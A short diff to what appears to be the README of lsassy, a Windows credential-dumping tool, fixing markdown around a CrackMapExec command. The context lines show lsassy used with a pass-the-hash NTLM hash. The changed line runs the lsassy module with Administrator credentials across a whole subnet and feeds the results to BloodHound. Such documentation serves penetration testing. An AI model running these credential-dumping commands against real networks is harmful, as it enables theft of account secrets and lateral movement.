@@ -91,7 +91,7 @@ lsassy --hashes 952c28bd2fd728898411b301475009b7 Administrator@desktop01.adsec.l
 ### CME Module
 
 ```
-crackmapexec smb 10.0.0.0/24 -d adsec.local -u Administrator -p Passw0rd -M lsassy -o BLOODHOUND=True NEO4JPASS=bloodhound```
+crackmapexec smb 10.0.0.0/24 -d adsec.local -u Administrator -p Passw0rd -M lsassy -o BLOODHOUND=True NEO4JPASS=bloodhound
 ```
 
 ## Installation
